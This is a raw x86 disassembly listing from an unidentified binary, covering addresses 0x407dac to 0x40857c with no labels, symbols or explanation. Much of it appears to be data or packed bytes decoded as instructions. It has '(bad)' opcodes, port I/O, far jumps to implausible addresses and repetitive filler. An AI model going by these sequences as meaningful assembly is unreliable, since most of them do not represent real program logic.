  407dac:	add    BYTE PTR [eax-0x6ffff42c],dl
  407db2:	sbb    ecx,DWORD PTR [esi]
  407db4:	add    BYTE PTR [eax-0x6ffff552],dl
  407dba:	out    dx,eax
  407dbb:	or     eax,DWORD PTR [eax]
  407dbd:	nop
  407dbe:	sbb    ecx,DWORD PTR [esi]
  407dc0:	add    BYTE PTR [eax-0x6ffff38a],dl
  407dc6:	(bad)  
  407dc7:	or     eax,DWORD PTR [eax]
  407dc9:	nop
  407dca:	sbb    ecx,DWORD PTR [esi]
  407dcc:	add    BYTE PTR [eax-0x6ffff392],dl
  407dd2:	mov    eax,ds:0xbb90000b
  407dd7:	add    al,BYTE PTR [eax]
  407dd9:	nop
  407dda:	mov    dl,0x1
  407ddc:	add    al,0x90
  407dde:	mov    dl,0xe5
  407de0:	add    edx,DWORD PTR [eax-0x6efb194e]
  407de6:	mov    bl,0xe6
  407de8:	add    al,0x91
  407dea:	mov    bl,0xe6
  407dec:	add    al,0x91
  407dee:	mov    bl,0xe6
  407df0:	add    al,0x91
  407df2:	mov    ch,0xe4
  407df4:	add    al,0x91
  407df6:	mov    bl,0xe6
  407df8:	add    al,0x91
  407dfa:	mov    bl,0xe6
  407dfc:	add    eax,0x5e3b391
  407e01:	add    BYTE PTR [eax],al
  407e03:	add    BYTE PTR [eax],al
  407e05:	add    BYTE PTR [edx-0x6dfa1c4c],dl
  407e0b:	mov    ah,0xe3
  407e0d:	call   DWORD PTR [ebx-0x6dfa1c52]
  407e13:	scas   al,BYTE PTR es:[edi]
  407e14:	jecxz  0x407e1b
  407e16:	xchg   edx,eax
  407e17:	mov    ah,0xe3
  407e19:	add    eax,0x5e9ae8c
  407e1e:	xchg   edx,eax
  407e1f:	mov    ah,0xe1
  407e21:	add    eax,0x5e3b492
  407e26:	xchg   edx,eax
  407e27:	scas   al,BYTE PTR es:[edi]
  407e28:	loope  0x407e29
  407e2a:	xchg   ecx,eax
  407e2b:	mov    ah,0xe3
  407e2d:	call   DWORD PTR [eax-0x6efb194f]
  407e33:	mov    cl,0xea
  407e35:	add    BYTE PTR [ecx-0x2f],dh
  407e38:	in     eax,0x6
  407e3a:	xchg   ebx,eax
  407e3b:	mov    al,0xe4
  407e3d:	push   es
  407e3e:	xchg   ebx,eax
  407e3f:	mov    bl,0xe4
  407e41:	push   es
  407e42:	xchg   ebx,eax
  407e43:	mov    bl,0xe4
  407e45:	push   es
  407e46:	xchg   ebx,eax
  407e47:	lods   eax,DWORD PTR ds:[esi]
  407e48:	in     al,0x6
  407e4a:	lea    esi,[ebx-0x4c6cf91c]
  407e50:	out    0x4,al
  407e52:	xchg   ecx,eax
  407e53:	mov    bl,0xe6
  407e55:	push   es
  407e56:	xchg   ecx,eax
  407e57:	mov    bl,0xe
  407e59:	call   0xe84e2fec
  407e5e:	xchg   esi,eax
  407e5f:	mov    cl,0xe
  407e61:	jmp    0xe54c32f2
  407e66:	nop
  407e67:	mov    al,0x7
  407e69:	loope  0x407e6b
  407e6b:	add    BYTE PTR [eax],al
  407e6d:	add    BYTE PTR [eax],al
  407e6f:	xchg   esp,eax
  407e70:	mov    esp,0xb888dd03
  407e75:	(bad)  
  407e76:	fcomp  DWORD PTR [esp+eiz*4-0x5f7f2ae5]
  407e7d:	pop    ss
  407e7e:	rol    DWORD PTR [esp+ebp*4-0x578732ed],1
  407e85:	bswap  ecx
  407e87:	lods   al,BYTE PTR ds:[esi]
  407e88:	shr    DWORD PTR [ebx],1
  407e8a:	lds    esi,FWORD PTR [eax-0x33]
  407e8d:	daa    
  407e8e:	shl    DWORD PTR [ecx+ebx*8+0x23],0xbd
  407e93:	push   0x7cb91fd5
  407e98:	sar    DWORD PTR [ebx],0xb5
  407e9b:	pusha  
  407e9c:	mov    ebp,0xc964b137
  407ea1:	xor    ebp,DWORD PTR [ebp-0x56d03aa8]
  407ea7:	sub    al,0x11
  407ea9:	ins    BYTE PTR es:[edi],dx
  407eaa:	(bad)
  407ead:	push   0x6418f4c1
  407eb2:	mov    ebp,0xb96014e8
  407eb7:	cld    
  407eb8:	add    BYTE PTR [ebp+esi*4-0x20],bh
  407ebc:	cld    
  407ebd:	ja     0x407e70
  407ebf:	in     al,0x8
  407ec1:	push   esp
  407ec2:	lea    edi,[eax]
  407ec4:	in     eax,0x4f
  407ec6:	mov    esp,ebp
  407ec8:	adc    BYTE PTR [ebp+eax*4+0x30],ch
  407ecc:	or     eax,0x19348168
  407ed1:	fs jge 0x407ed4
  407ed4:	add    BYTE PTR [eax],al
  407ed6:	add    BYTE PTR [eax],al
  407ed8:	sub    BYTE PTR ds:0x3e790060,dl
  407ede:	jle    0x407f53
  407ee0:	gs inc edx
  407ee2:	jp     0x407f5b
  407ee4:	popa   
  407ee5:	inc    esi
  407ee6:	jbe    0x407f63
  407ee8:	ins    DWORD PTR es:[edi],dx
  407ee9:	dec    edx
  407eea:	jb     0x407f6b
  407eec:	imul   esi,DWORD PTR [ebx],0x735838d
  407ef2:	mov    DWORD PTR [edi-0x747ac4cf],eax
  407ef8:	pop    ebp
  407ef9:	das    
  407efa:	or     DWORD PTR [edi-0x6c62dca7],0x97993745
  407f04:	inc    ecx
  407f05:	sub    edx,DWORD PTR [ebp-0x6ee0b265]
  407f0b:	lahf   
  407f0c:	dec    ecx
  407f0d:	adc    ebp,DWORD PTR [ebp-0x571a2a5d]
  407f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f14:	rcr    DWORD PTR [ecx],1
  407f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f17:	stos   DWORD PTR es:[edi],eax
  407f18:	mov    ebp,0xb9afa10d
  407f1d:	add    DWORD PTR [ebp-0x46ea5a4d],edi
  407f23:	mov    bh,0xa1
  407f25:	or     DWORD PTR [ebp-0x4f025245],esi
  407f2b:	mov    edi,0xc3ccf1a9
  407f30:	jne    0x407ef7
  407f32:	enter  0x71c7,0xf9
  407f36:	(bad)  
  407f37:	retf   
  407f38:	popf   
  407f39:	in     eax,dx
  407f3a:	ror    bh,0x0
  407f3d:	add    BYTE PTR [eax],al
  407f3f:	add    BYTE PTR [eax],al
  407f41:	cdq    
  407f42:	loope  0x407f20
  407f44:	rol    DWORD PTR [ebp-0x7e28270b],cl
  407f4a:	jmp    0xddce5b23
  407f4f:	rcr    bh,1
  407f51:	mov    ecx,edx
  407f53:	in     al,dx
  407f54:	jecxz  0x407eeb
  407f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f57:	call   0x23f41043
  407f5c:	jmp    0x8be7:0xee2987eb
  407f63:	cmp    eax,0x217fe3f2
  407f68:	neg    bh
  407f6a:	xor    DWORD PTR ds:0x3997dbfa,0xfffffffe
  407f71:	xlat   BYTE PTR ds:[ebx]
  407f72:	fwait
  407f73:	or     eax,0xf18f9302
  407f78:	add    eax,0xa05938f
  407f7d:	mov    esp,DWORD PTR [edi+0x9]
  407f80:	push   cs
  407f81:	xchg   DWORD PTR [ebx+0x1d],ebp
  407f84:	adc    al,BYTE PTR [ebx+0x7f16015f]
  407f8a:	arpl   WORD PTR ds:0x19777b1a,dx
  407f90:	push   ds
  407f91:	ja     0x40800e
  407f93:	in     eax,dx
  407f94:	and    DWORD PTR [ebx-0x50da2e91],esi
  407f9a:	jae    0x407f81
  407f9c:	sub    DWORD PTR [ebx-0x58d216b9],ebp
  407fa2:	dec    ebx
  407fa3:	std    
  407fa4:	xor    DWORD PTR [eax],eax
  407fa6:	add    BYTE PTR [eax],al
  407fa8:	add    BYTE PTR [eax],al
  407faa:	mov    ds:0x9f35e13f,eax
  407faf:	inc    ebx
  407fb0:	cmc    
  407fb1:	cmp    DWORD PTR [ebx-0x68c206a9],ebx
  407fb7:	pop    ebx
  407fb8:	lods   eax,DWORD PTR ds:[esi]
  407fb9:	popa   
  407fba:	mov    bl,0x6f
  407fbc:	xchg   ecx,eax
  407fbd:	gs scas eax,DWORD PTR es:[edi]
  407fbf:	jae    0x407f66
  407fc1:	imul   ebp,DWORD PTR [ebx-0x589256b9],0xa371bd4b
  407fcb:	aas    
  407fcc:	mov    eax,ds:0xb5439f75
  407fd1:	jns    0x407f8e
  407fd3:	aaa    
  407fd4:	fstp   DWORD PTR [ebp-0x49]
  407fd7:	mov    dl,0x85
  407fd9:	ret    0xf151
  407fdc:	test   eax,0xaded4dbe
  407fe1:	retf   0xf949
  407fe4:	xchg   ecx,eax
  407fe5:	mov    BYTE PTR [ebp-0xb],0x95
  407fe9:	rol    BYTE PTR [ecx-0x1f],cl
  407fec:	cdq    
  407fed:	into   
  407fee:	cmp    eax,0x39da9ddd
  407ff3:	or     DWORD PTR [edx-0x4a],esp
  407ff6:	push   ebp
  407ff7:	add    eax,0x31128566
  407ffc:	push   0xffffff81
  407ffe:	push   cs
  407fff:	sub    eax,0x390a8d6e
  408004:	push   edx
  408005:	mov    DWORD PTR [esi],eax
  408007:	xor    eax,0x21029556
  40800c:	pop    edx
  40800d:	xchg   ecx,eax
  40800e:	add    BYTE PTR [eax],al
  408010:	add    BYTE PTR [eax],al
  408012:	add    dh,bh
  408014:	sbb    al,0x5e
  408016:	popf   
  408017:	cli    
  408018:	sub    BYTE PTR [edx-0x67],al
  40801b:	mul    BYTE PTR [esi+eax*2]
  40801e:	xor    dl,BYTE PTR gs:[eax+0x4a]
  408022:	popa   
  408023:	cs dec esp
  408025:	dec    esi
  408026:	ins    DWORD PTR es:[edi],dx
  408027:	sub    bl,BYTE PTR [eax+0x32]
  40802a:	imul   esp,DWORD PTR [esi],0x22753654
  408030:	inc    eax
  408031:	cmp    dh,BYTE PTR [ecx+0x1e]
  408034:	cmp    al,0x3e
  408036:	jge    0x408052
  408038:	dec    eax
  408039:	and    bh,BYTE PTR [ecx+0x16]
  40803c:	inc    esp
  40803d:	es inc ebp
  40803f:	push   edx
  408040:	jo     0x40806c
  408042:	inc    ecx
  408043:	dec    esi
  408044:	ins    BYTE PTR es:[edi],dx
  408045:	cs dec ebp
  408047:	dec    edx
  408048:	js     0x40805c
  40804a:	dec    ecx
  40804b:	inc    esi
  40804c:	je     0x408064
  40804e:	push   ebp
  40804f:	inc    edx
  408050:	pusha  
  408051:	sbb    dl,BYTE PTR [ecx+0x3e]
  408054:	pop    esp
  408055:	movups XMMWORD PTR [ebp-0x46f22b98],xmm7
  40805c:	ror    BYTE PTR fs:[ecx],1
  40805f:	mov    ch,0x90
  408061:	in     al,dx
  408062:	add    eax,0x1e88cb1
  408067:	lods   eax,DWORD PTR ds:[esi]
  408068:	cwde   
  408069:	in     al,0xfd
  40806b:	test   al,0x94
  40806d:	loopne 0x408068
  40806f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408070:	cmp    ah,0xf5
  408073:	mov    al,ds:0xf1f87c
  408078:	add    BYTE PTR [eax],al
  40807a:	add    BYTE PTR [eax],al
  40807c:	pushf  
  40807d:	mov    ah,dh
  40807f:	in     eax,dx
  408080:	cwde   
  408081:	test   al,dh
  408083:	jmp    0xe931044d
  408088:	xchg   ebx,eax
  408089:	mov    dl,0xe
  40808b:	jmp    0xe94f3323
  408090:	xchg   ebx,eax
  408091:	mov    dl,0xe
  408093:	jmp    0xe94f332b
  408098:	xchg   ebx,eax
  408099:	mov    dl,0xe
  40809b:	jmp    0xe94f3333
  4080a0:	xchg   ebx,eax
  4080a1:	mov    dl,0xe
  4080a3:	jmp    0xe94f333b
  4080a8:	xchg   ebx,eax
  4080a9:	or     DWORD PTR [edi+edx*1],0xffffff94
  4080ad:	mov    dl,0xe
  4080af:	jl     0x94298f67
  4080b5:	mov    dl,0xe
  4080b7:	jmp    0xe94f334f
  4080bc:	xchg   ebx,eax
  4080bd:	mov    dl,0xe
  4080bf:	jmp    0xe94f3357
  4080c4:	xchg   ebx,eax
  4080c5:	mov    dl,0xe
  4080c7:	jmp    0xe94d045f
  4080cc:	xchg   ebx,eax
  4080cd:	mov    dl,0xe
  4080cf:	jmp    0x4f3367
  4080d4:	cmp    DWORD PTR [edi-0x50c6fff2],ebp
  4080da:	push   cs
  4080db:	add    BYTE PTR [ecx],ch
  4080dd:	scas   eax,DWORD PTR es:[edi]
  4080de:	push   cs
  4080df:	add    BYTE PTR [eax],al
  4080e1:	add    BYTE PTR [eax],al
  4080e3:	add    BYTE PTR [eax],al
  4080e5:	sub    DWORD PTR [edi-0x5106fff2],ebp
  4080eb:	push   cs
  4080ec:	add    cl,bh
  4080ee:	scas   al,BYTE PTR es:[edi]
  4080ef:	push   cs
  4080f0:	add    BYTE PTR [edi-0x16f81044],ah
  4080f6:	scas   al,BYTE PTR es:[edi]
  4080f7:	push   cs
  4080f8:	add    cl,bh
  4080fa:	scas   al,BYTE PTR es:[edi]
  4080fb:	push   cs
  4080fc:	add    cl,bh
  4080fe:	scas   al,BYTE PTR es:[edi]
  4080ff:	push   cs
  408100:	add    cl,ch
  408102:	scas   al,BYTE PTR es:[edi]
  408103:	push   cs
  408104:	add    cl,ch
  408106:	scas   al,BYTE PTR es:[edi]
  408107:	push   cs
  408108:	add    BYTE PTR [ecx-0x46fff152],bh
  40810e:	scas   al,BYTE PTR es:[edi]
  40810f:	push   cs
  408110:	add    BYTE PTR [ecx-0x38fff152],ch
  408116:	mov    esp,0xaeb907ef
  40811b:	push   cs
  40811c:	add    BYTE PTR [ecx-0x56fff152],bh
  408122:	scas   al,BYTE PTR es:[edi]
  408123:	push   cs
  408124:	add    BYTE PTR [ecx+0x79000eae],ch
  40812a:	mov    dh,0xe
  40812c:	add    BYTE PTR [ecx-0x4a],bh
  40812f:	out    dx,eax
  408130:	add    esp,DWORD PTR [edi]
  408132:	enter  0x87ef,0x7
  408136:	enter  0x7ef,0x79
  40813a:	mov    dh,0xe
  40813c:	add    BYTE PTR [ecx-0x4a],bh
  40813f:	push   cs
  408140:	add    BYTE PTR [ecx-0x4a],ch
  408143:	push   cs
  408144:	add    BYTE PTR [ecx-0x4a],ch
  408147:	push   cs
  408148:	add    BYTE PTR [eax],al
  40814a:	add    BYTE PTR [eax],al
  40814c:	add    BYTE PTR [eax],al
  40814e:	cmp    DWORD PTR [esi-0x3818fff2],esi
  408154:	out    dx,eax
  408155:	call   DWORD PTR [eax+0x37ff39e8]
  40815b:	icebp  
  40815c:	cmp    edi,edi
  40815e:	scas   eax,DWORD PTR es:[edi]
  40815f:	mov    ecx,DWORD PTR [eax+eax*1]
  408162:	nop
  408163:	mov    ecx,DWORD PTR [eax+eax*1]
  408166:	nop
  408167:	mov    ecx,DWORD PTR [eax+eax*1]
  40816a:	nop
  40816b:	mov    ecx,DWORD PTR [eax+eax*1]
  40816e:	nop
  40816f:	mov    ecx,DWORD PTR [eax+eax*1]
  408172:	nop
  408173:	mov    al,ds:0xa8ffff39
  408178:	cmp    edi,edi
  40817a:	div    DWORD PTR [eax-0x749000c7]
  408180:	or     al,0x0
  408182:	nop
  408183:	mov    ecx,DWORD PTR [eax+eax*1]
  408186:	nop
  408187:	mov    ecx,DWORD PTR [eax+eax*1]
  40818a:	nop
  40818b:	mov    ecx,DWORD PTR [eax+eax*1]
  40818e:	nop
  40818f:	mov    ecx,DWORD PTR [eax+eax*1]
  408192:	nop
  408193:	popa   
  408194:	cmp    eax,DWORD PTR [eax]
  408196:	mov    esp,0xb8000c8a
  40819b:	mov    cl,BYTE PTR [eax+eax*1]
  40819e:	sub    BYTE PTR [ebx-0x746ffff4],cl
  4081a4:	or     al,0x0
  4081a6:	nop
  4081a7:	mov    ecx,DWORD PTR [eax+eax*1]
  4081aa:	nop
  4081ab:	mov    ecx,DWORD PTR [eax+eax*1]
  4081ae:	nop
  4081af:	pop    eax
  4081b0:	cmp    edi,edi
  4081b2:	add    BYTE PTR [eax],al
  4081b4:	add    BYTE PTR [eax],al
  4081b6:	add    BYTE PTR [edi-0x6ffff375],al
  4081bc:	mov    ecx,DWORD PTR [eax+eax*1]
  4081bf:	nop
  4081c0:	mov    ecx,DWORD PTR [eax+eax*1]
  4081c3:	adc    BYTE PTR [ebx-0x746ffff4],cl
  4081c9:	or     al,0x0
  4081cb:	nop
  4081cc:	mov    ecx,DWORD PTR [eax+eax*1]
  4081cf:	nop
  4081d0:	mov    ecx,DWORD PTR [eax+eax*1]
  4081d3:	nop
  4081d4:	mov    dl,0x65
  4081d6:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  4081dc:	mov    dl,0xe5
  4081de:	add    dl,BYTE PTR [ecx-0x6ffd194e]
  4081e4:	mov    dl,0xe5
  4081e6:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  4081ec:	mov    dl,0xe5
  4081ee:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  4081f4:	mov    dl,0xe6
  4081f6:	add    edx,DWORD PTR [eax-0x6ffc9a4e]
  4081fc:	mov    dl,0x65
  4081fe:	adc    DWORD PTR [eax],0x32
  408201:	out    0x3,al
  408203:	adc    BYTE PTR [edx-0x617be817],dh
  408209:	rcl    DWORD PTR [edi],1
  40820b:	jl     0x4081ab
  40820d:	fst    DWORD PTR [edi]
  40820f:	nop
  408210:	mov    dl,0xe5
  408212:	add    edx,DWORD PTR [eax-0x55f219ce]
  408218:	pushf  
  408219:	or     ecx,DWORD PTR [esi]
  40821b:	add    BYTE PTR [eax],al
  40821d:	add    BYTE PTR [eax],al
  40821f:	add    BYTE PTR [edx-0x5dea0c5c],bl
  408225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408226:	repz adc eax,0x15d3a482
  40822c:	and    BYTE PTR [ebx+edx*8-0x2c5b7deb],0x15
  408234:	xor    BYTE PTR [edx],0x66
  408237:	add    al,0x10
  408239:	mov    ds:0x9caa0de5,eax
  40823e:	or     ecx,DWORD PTR [esi]
  408240:	call   0xf3a4:0xa215f3a4
  408247:	adc    eax,0x15d3a482
  40824c:	and    BYTE PTR [ebx+edx*8+0xea48215],0xdb
  408254:	jge    0x4081fa
  408256:	mov    gs,WORD PTR [ecx-0x6c]
  408259:	mov    dl,0xe
  40825b:	jmp    0xe94f34f3
  408260:	xchg   ebx,eax
  408261:	mov    dl,0xe
  408263:	jmp    0xe94f34fb
  408268:	xchg   ebx,eax
  408269:	mov    dl,0xe
  40826b:	jmp    0xe94f3503
  408270:	xchg   ebx,eax
  408271:	mov    dl,0xe
  408273:	jmp    0xe94f350b
  408278:	xchg   ebx,eax
  408279:	mov    dl,0xe
  40827b:	jmp    0xe94f3513
  408280:	xchg   ebx,eax
  408281:	mov    dl,0xe
  408283:	jmp    0x408288
  408288:	add    BYTE PTR [ebx-0x6c16f14e],dl
  40828e:	mov    dl,0xe
  408290:	jmp    0xe94f3528
  408295:	xchg   ebx,eax
  408296:	mov    dl,0xe
  408298:	jmp    0xe94f3530
  40829d:	xchg   ebx,eax
  40829e:	mov    dl,0xe
  4082a0:	jmp    0xe94f3538
  4082a5:	xchg   ebx,eax
  4082a6:	mov    dl,0xe
  4082a8:	jmp    0xe94f3540
  4082ad:	xchg   ebx,eax
  4082ae:	mov    dl,0xe
  4082b0:	jmp    0xe94f3548
  4082b5:	xchg   ebx,eax
  4082b6:	mov    dl,0xe
  4082b8:	jmp    0xe94f3550
  4082bd:	xchg   ebx,eax
  4082be:	mov    dl,0xe
  4082c0:	jmp    0xe94f3558
  4082c5:	xchg   ebx,eax
  4082c6:	mov    dl,0xe
  4082c8:	jmp    0xe94f3560
  4082cd:	xchg   ebx,eax
  4082ce:	mov    dl,0xe
  4082d0:	add    BYTE PTR [ecx-0x4d],bh
  4082d3:	push   cs
  4082d4:	add    BYTE PTR [ecx-0x4d],ch
  4082d7:	push   cs
  4082d8:	add    BYTE PTR [ecx-0x4d],ch
  4082db:	push   cs
  4082dc:	add    BYTE PTR [ecx],bh
  4082de:	mov    bl,0xe
  4082e0:	add    BYTE PTR [ecx],bh
  4082e2:	xchg   ebp,eax
  4082e3:	lldt   ax
  4082e6:	test   al,0x4b
  4082e8:	add    BYTE PTR [eax],ch
  4082ea:	xchg   ebp,eax
  4082eb:	sldt   WORD PTR [eax]
  4082ee:	add    BYTE PTR [eax],al
  4082f0:	add    BYTE PTR [eax],al
  4082f2:	pusha  
  4082f3:	test   al,0x4b
  4082f5:	add    BYTE PTR [ebx],bh
  4082f7:	xchg   ebp,eax
  4082f8:	(bad)  
  4082fa:	jo     0x4082a4
  4082fc:	dec    ebx
  4082fd:	add    BYTE PTR [edx],ch
  4082ff:	xchg   ebp,eax
  408300:	verr   WORD PTR [eax-0xaffb458]
  408307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408308:	push   cs
  408309:	add    cl,bh
  40830b:	cwde   
  40830c:	dec    ebx
  40830d:	add    ah,ah
  40830f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408310:	push   cs
  408311:	add    cl,ch
  408313:	cwde   
  408314:	dec    ebx
  408315:	add    bh,dh
  408317:	xchg   esp,eax
  408318:	lock push DWORD PTR [eax-0x19ffb458]
  40831f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408320:	push   cs
  408321:	add    cl,ch
  408323:	cwde   
  408324:	dec    ebx
  408325:	add    cl,al
  408327:	xchg   esp,eax
  408328:	lock call eax
  40832b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40832c:	dec    ebx
  40832d:	add    BYTE PTR [eax-0x1f000f6c],dh
  408333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408334:	dec    ebx
  408335:	add    BYTE PTR [ebx-0x46fff15d],ah
  40833b:	cwde   
  40833c:	dec    ebx
  40833d:	add    BYTE PTR [edx+0x20fff094],dh
  408343:	test   al,0x4b
  408345:	add    BYTE PTR [ebp-0x5f],bh
  408348:	push   cs
  408349:	add    BYTE PTR [ecx-0x64],bh
  40834c:	dec    ebx
  40834d:	add    BYTE PTR [eax-0x6fff156a],dl
  408353:	inc    edx
  408354:	sbb    al,BYTE PTR [ebx+0x0]
  408357:	add    BYTE PTR [eax],al
  408359:	add    BYTE PTR [eax],al
  40835b:	nop
  40835c:	test   edx,ebp
  40835e:	call   FWORD PTR [edi+0x53]
  408361:	sbb    al,BYTE PTR [ebx-0x70]
  408364:	xchg   esp,eax
  408365:	sti    
  408366:	add    DWORD PTR [eax-0x6fbce5de],edx
  40836c:	jnp    0x408358
  40836e:	add    BYTE PTR [eax-0x6fbce60e],dl
  408374:	jp     0x408360
  408376:	add    BYTE PTR [eax-0x6fbce63e],dl
  40837c:	pop    ecx
  40837d:	jmp    0x9043:0x19d29000
  408384:	pop    eax
  408385:	jmp    0x9043:0x19a29000
  40838c:	jg     0x408378
  40838e:	add    BYTE PTR [eax-0x6fbce60e],dl
  408394:	jle    0x408380
  408396:	add    BYTE PTR [eax-0x6fbce63e],dl
  40839c:	pop    ebp
  40839d:	jmp    0x9043:0x19d29000
  4083a4:	pop    esp
  4083a5:	jmp    0x9043:0x19a29000
  4083ac:	mov    bl,0xe8
  4083ae:	add    BYTE PTR [eax-0x6fbce48e],dl
  4083b4:	sbb    BYTE PTR ds:0x167b9000,0x43
  4083bb:	nop
  4083bc:	xchg   ecx,eax
  4083bd:	sbb    eax,0x0
  4083c2:	add    BYTE PTR [eax],al
  4083c4:	nop
  4083c5:	pop    ebx
  4083c6:	push   ss
  4083c7:	inc    ebx
  4083c8:	nop
  4083c9:	pusha  
  4083ca:	sbb    eax,0x165b9000
  4083cf:	inc    ebx
  4083d0:	nop
  4083d1:	mov    dl,0x9
  4083d3:	adc    edx,DWORD PTR [eax-0x2ce60a4e]
  4083d9:	mov    dl,0xfa
  4083db:	adc    dl,BYTE PTR [eax-0x2ce60a4e]
  4083e1:	mov    dl,0xe7
  4083e3:	adc    dl,BYTE PTR [eax-0x2ce62a4e]
  4083e9:	mov    dl,0xd8
  4083eb:	in     eax,0x90
  4083ed:	mov    dl,0x9e
  4083ef:	adc    al,0xd3
  4083f1:	mov    dl,0x5
  4083f3:	out    0x90,al
  4083f5:	mov    dl,0x4e
  4083f7:	adc    al,0xd3
  4083f9:	mov    dl,0x6
  4083fb:	out    0x90,al
  4083fd:	mov    dl,0x3e
  4083ff:	adc    al,0xd3
  408401:	mov    dl,0x3
  408403:	out    0x90,al
  408405:	mov    dl,0x2e
  408407:	adc    al,0xd3
  408409:	mov    dl,0x4
  40840b:	out    0x90,al
  40840d:	mov    dl,0x1e
  40840f:	adc    al,0x53
  408411:	mov    dl,0xc1
  408413:	adc    dl,BYTE PTR [eax+0x5319f5b2]
  408419:	mov    dl,0xc2
  40841b:	adc    dl,BYTE PTR [eax+0x5319f5b2]
  408421:	mov    dl,0xbf
  408423:	adc    dl,BYTE PTR [eax+0x19d5b2]
  408429:	add    BYTE PTR [eax],al
  40842b:	add    BYTE PTR [eax],al
  40842d:	push   ebx
  40842e:	mov    dl,0xc0
  408430:	adc    dl,BYTE PTR [eax+0x5319d5b2]
  408436:	mov    dl,0x1d
  408438:	loop   0x4083ca
  40843a:	mov    dl,0xce
  40843c:	adc    edx,DWORD PTR [ebx-0x4e]
  40843f:	push   cs
  408440:	loop   0x4083d2
  408442:	mov    dl,0xbe
  408444:	adc    edx,DWORD PTR [ebx-0x4e]
  408447:	sbb    esp,edx
  408449:	nop
  40844a:	mov    dl,0xae
  40844c:	adc    edx,DWORD PTR [ebx-0x4e]
  40844f:	push   cs
  408450:	add    dh,BYTE PTR [edx-0x4d]
  408453:	push   cs
  408454:	nop
  408455:	mov    ds:0x71d50eef,eax
  40845a:	mov    bl,0xe
  40845c:	shl    BYTE PTR [ebx+0x71c40eef],0xb3
  408463:	push   cs
  408464:	mov    al,0x83
  408466:	out    dx,eax
  408467:	push   cs
  408468:	xlat   BYTE PTR ds:[ebx]
  408469:	jno    0x40841e
  40846b:	push   cs
  40846c:	mov    al,ds:0xc60eef83
  408471:	xor    DWORD PTR [ebx-0x105c6ff2],esi
  408477:	push   cs
  408478:	sbb    DWORD PTR [edx],esi
  40847a:	jl     0x40846c
  40847c:	inc    eax
  40847d:	mov    ds:0x32180eef,eax
  408482:	jl     0x408474
  408484:	xor    BYTE PTR [ebx+0x31fb0eef],al
  40848a:	jl     0x40847c
  40848c:	and    BYTE PTR [ebx+0xfa0eef],al
  408492:	add    BYTE PTR [eax],al
  408494:	add    BYTE PTR [eax],al
  408496:	icebp  
  408497:	jnp    0x408489
  408499:	adc    BYTE PTR [ebx-0xe22f111],ah
  40849f:	jnp    0x408491
  4084a1:	inc    eax
  4084a2:	mov    ds:0xf1dc0eef,eax
  4084a7:	jnp    0x408499
  4084a9:	xor    BYTE PTR [ebx-0x7b40f111],al
  4084af:	mov    dl,0xe
  4084b1:	fnstcw WORD PTR [ebp-0x11]
  4084b4:	push   cs
  4084b5:	mov    esi,0xd90eb2a4
  4084ba:	popf   
  4084bb:	out    dx,eax
  4084bc:	push   cs
  4084bd:	and    DWORD PTR [ebp-0x6206f14e],esp
  4084c3:	out    dx,eax
  4084c4:	push   cs
  4084c5:	adc    BYTE PTR [ebp+0x7df90eb2],al
  4084cb:	out    dx,eax
  4084cc:	push   cs
  4084cd:	add    BYTE PTR [ebx-0x46fff15b],dl
  4084d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d4:	dec    ebx
  4084d5:	add    BYTE PTR [edx+0x69000ea6],al
  4084db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084dc:	dec    ebx
  4084dd:	add    BYTE PTR [ebp-0x5a],dh
  4084e0:	push   cs
  4084e1:	add    BYTE PTR [ecx-0x5b],bh
  4084e4:	dec    ebx
  4084e5:	add    BYTE PTR [esi+eiz*4+0xe],al
  4084e9:	add    BYTE PTR [ecx-0x5b],ch
  4084ec:	dec    ebx
  4084ed:	add    BYTE PTR [edi-0x5a],dl
  4084f0:	push   cs
  4084f1:	add    BYTE PTR [ecx],bh
  4084f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f4:	dec    ebx
  4084f5:	add    BYTE PTR [esi],al
  4084f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084f8:	push   cs
  4084f9:	add    BYTE PTR [eax],al
  4084fb:	add    BYTE PTR [eax],al
  4084fd:	add    BYTE PTR [eax],al
  4084ff:	imul   esp,DWORD PTR [ebp-0x6f16ffb5],0xa0d0000f
  408509:	dec    ebx
  40850a:	add    al,bh
  40850c:	nop
  40850d:	verr   WORD PTR [eax-0x60]
  408511:	dec    ebx
  408512:	add    bl,ch
  408514:	nop
  408515:	(bad)  
  408517:	jo     0x4084b9
  408519:	dec    ebx
  40851a:	add    BYTE PTR [edx],bh
  40851c:	xchg   ecx,eax
  40851d:	verr   WORD PTR [eax+0x2d004ba0]
  408524:	xchg   ecx,eax
  408525:	lldt   WORD PTR [eax-0x60]
  408529:	dec    ebx
  40852a:	add    BYTE PTR [ecx+edx*4],bh
  40852d:	verr   WORD PTR [eax+0x2f004ba0]
  408534:	xchg   ecx,eax
  408535:	(bad)  
  408537:	mov    al,0xa0
  408539:	dec    ebx
  40853a:	add    dh,bh
  40853c:	nop
  40853d:	verr   WORD PTR [eax-0x7effb460]
  408544:	nop
  408545:	lldt   ax
  408548:	mov    al,ds:0xd290004b
  40854d:	in     al,dx
  40854e:	add    BYTE PTR [eax-0x6fbce1be],dl
  408554:	mov    edi,0x529000ec
  408559:	push   ds
  40855a:	inc    ebx
  40855b:	nop
  40855c:	aam    0xec
  40855e:	add    BYTE PTR [eax+0x431e22],dl
  408564:	add    BYTE PTR [eax],al
  408566:	add    BYTE PTR [eax],al
  408568:	nop
  408569:	mov    edi,0x729000ec
  40856e:	push   ds
  40856f:	inc    ebx
  408570:	nop
  408571:	into   
  408572:	in     al,dx
  408573:	add    BYTE PTR [eax-0x6fbce1be],dl
  408579:	shr    esp,0x0
  40857c:	nop
